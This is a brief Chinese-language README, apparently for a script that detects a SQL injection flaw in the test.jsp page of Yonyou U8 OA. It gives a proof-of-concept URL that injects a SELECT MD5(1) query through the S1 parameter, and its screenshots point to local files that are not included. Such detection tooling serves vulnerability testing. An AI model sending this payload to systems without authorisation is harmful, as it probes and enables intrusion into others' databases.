# U8detectPoc_Sql
# U8detectPoc_Sql

对于用友 U8 OA test.jsp文件存在 SQL注入漏洞,进行脚本化检测POC![image-20220929114714236](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220929114714236.png)

-h / --help使用帮助参数![image-20220929114838298](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220929114838298.png)

-u 输入url网站地址直接进行检测是否存在漏洞

poc:

```
http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))

```

via:PeiQi
